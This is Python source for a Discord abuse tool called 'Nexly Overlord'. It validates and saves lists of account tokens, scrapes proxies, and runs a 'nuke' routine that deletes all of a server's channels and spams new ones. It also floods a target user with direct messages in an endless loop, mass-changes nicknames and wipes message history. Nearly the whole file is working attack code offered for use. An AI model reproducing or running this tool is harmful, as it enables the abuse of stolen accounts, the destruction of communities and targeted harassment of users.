import os, sys, time, json, random, threading, requests, ctypes, base64
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

# SESSİZ MOD VE RENK ŞEMASI
STDOUT_LOCK = threading.Lock()
R, G, B, M, C, Y, W = Fore.RED, Fore.GREEN, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.YELLOW, Fore.WHITE

class NexlyInternal:
    def __init__(self):
        self.ver = "15.0.4"
        self.session = requests.Session()
        self.tokens = self._load_raw("tokens.txt")
        self.proxies = self._load_raw("proxies.txt")
        self.valid = []
        self._setup_terminal()

    def _setup_terminal(self):
        title = f"Nexly Overlord v{self.ver} | Tokens: {len(self.tokens)} | Proxies: {len(self.proxies)}"
        ctypes.windll.kernel32.SetConsoleTitleW(title) if os.name == "nt" else None

    def _load_raw(self, path):
        if not os.path.exists(path):
            with open(path, "w") as f: pass
            return []
        return [l.strip() for l in open(path, "r", errors="ignore").readlines() if l.strip()]

    def _log(self, status, text, color):
        with STDOUT_LOCK:
            now = datetime.now().strftime("%H:%M:%S")
            print(f"{W}[{now}] {color}[{status}] {W}{text}")

    def _get_ua(self):
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    def _headers(self, token):
        return {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": self._get_ua(),
            "X-Context-Properties": base64.b64encode(json.dumps({"vendor": "Discord", "os": "Windows"}).encode()).decode()
        }

    # --- CORE EXPLOIT MODULES ---

    def checker_engine(self, token):
        try:
            r = self.session.get("https://discord.com/api/v9/users/@me", headers=self._headers(token), timeout=5)
            if r.status_code == 200:
                user = r.json()
                self._log("VALID", f"{user['username']}#{user['discriminator']}", G)
                self.valid.append(token)
                with open("output/valid.txt", "a") as f: f.write(f"{token}\n")
            elif r.status_code == 401:
                self._log("DEAD", f"{token[:20]}...", R)
            elif r.status_code == 429:
                self._log("LIMIT", "Rate limited, backing off", Y)
        except Exception:
            self._log("ERROR", "Connection refused", R)

    def scrape_proxies(self):
        self._log("TASK", "Scraping fresh proxies...", C)
        sources = [
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
        ]
        for s in sources:
            try:
                r = requests.get(s, timeout=10)
                with open("proxies.txt", "a") as f: f.write(r.text)
            except: pass
        self.proxies = self._load_raw("proxies.txt")

    def nuke_sequence(self, token, guild_id, ch_name):
        h = self._headers(token)
        try:
            chans = self.session.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=h).json()
            for c in chans:
                threading.Thread(target=lambda id=c['id']: self.session.delete(f"https://discord.com/api/v9/channels/{id}", headers=h)).start()
            for _ in range(60):
                threading.Thread(target=lambda: self.session.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=h, json={"name": ch_name, "type": 0})).start()
        except Exception: pass

    def mass_dm_flood(self, token, target_id, message):
        h = self._headers(token)
        try:
            chan = self.session.post(f"https://discord.com/api/v9/users/@me/channels", headers=h, json={"recipient_id": target_id}).json()
            if 'id' in chan:
                cid = chan['id']
                while True:
                    r = self.session.post(f"https://discord.com/api/v9/channels/{cid}/messages", headers=h, json={"content": message})
                    if r.status_code == 429: time.sleep(r.json()['retry_after'])
                    elif r.status_code != 200: break
                    self._log("DM", f"Packet sent from {token[:8]}", G)
        except: pass

    def mass_nick_loop(self, token, guild_id, nick):
        try:
            self.session.patch(f"https://discord.com/api/v9/guilds/{guild_id}/members/@me", headers=self._headers(token), json={"nick": nick})
        except: pass

    def clear_history(self, token, channel_id):
        h = self._headers(token)
        try:
            msgs = self.session.get(f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=100", headers=h).json()
            for m in msgs:
                if m['author']['id'] == "@me":
                    self.session.delete(f"https://discord.com/api/v9/channels/{channel_id}/messages/{m['id']}", headers=h)
        except: pass

# --- UI ENGINE ---
class NexlyUI:
    @staticmethod
    def banner():
        os.system('cls' if os.name == 'nt' else 'clear')
        art = f"""
{M}    ███╗   ██╗███████╗██╗  ██╗██╗     ██╗   ██╗
{M}    ████╗  ██║██╔════╝╚██╗██╔╝██║     ╚██╗ ██╔╝
{R}    ██╔██╗ ██║█████╗   ╚███╔╝ ██║      ╚████╔╝ 
{R}    ██║╚██╗██║██╔══╝   ██╔██╗ ██║       ╚██╔╝  
{B}    ██║ ╚████║███████╗██╔╝ ██╗███████╗   ██║   
{B}    ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝ {W}v15.0
        """
        print(art)
        print(f"      {R}SYSTEM CORE: {W}LOADED | {R}ENGINE: {W}ACTIVE | {R}THREADING: {W}MAX")
        print(f"      {B}" + "—"*50)

    @staticmethod
    def menu():
        opts = [
            "(01) Check Tokens", "(11) Voice Connect", "(21) Weapon Spam",
            "(04) Webhook Spam", "(12) Guild Spam", "(24) DM Cleaner",
            "(06) Mass DM", "(14) Set Nickname", "(25) Inspect Token",
            "(07) Disable Token", "(19) Nuke Guild", "(29) Wipe Channel",
            "(10) Friend Spam", "(20) Quit Guild", "(99) Proxy Scraper"
        ]
        for i in range(0, len(opts), 3):
            print(f"      {W}{opts[i]:<20} {W}{opts[i+1]:<20} {W}{opts[i+2]:<20}")
        print(f"      {B}" + "—"*50)

def main():
    if not os.path.exists("output"): os.makedirs("output")
    core = NexlyInternal()
    while True:
        NexlyUI.banner()
        NexlyUI.menu()
        cmd = input(f"\n      {R}Nexly@Exploit {W}> ")

        if cmd == "1" or cmd == "01":
            for t in core.tokens: threading.Thread(target=core.checker_engine, args=(t,)).start()
        elif cmd == "99":
            core.scrape_proxies()
        elif cmd == "6" or cmd == "06":
            uid = input(f"      {C}User ID: ")
            msg = input(f"      {C}Message: ")
            for t in core.tokens: threading.Thread(target=core.mass_dm_flood, args=(t, uid, msg)).start()
        elif cmd == "19":
            gid = input(f"      {C}Guild ID: ")
            name = input(f"      {C}Channel Name: ")
            for t in core.tokens: threading.Thread(target=core.nuke_sequence, args=(t, gid, name)).start()
        elif cmd == "14":
            gid = input(f"      {C}Guild ID: ")
            nick = input(f"      {C}Nickname: ")
            for t in core.tokens: threading.Thread(target=core.mass_nick_loop, args=(t, gid, nick)).start()
        elif cmd == "29":
            cid = input(f"      {C}Channel ID: ")
            for t in core.tokens: threading.Thread(target=core.clear_history, args=(t, cid)).start()
        elif cmd == "exit": break
        
        input(f"\n      {Y}Execution finished. Press Enter...")

if __name__ == "__main__":
    main()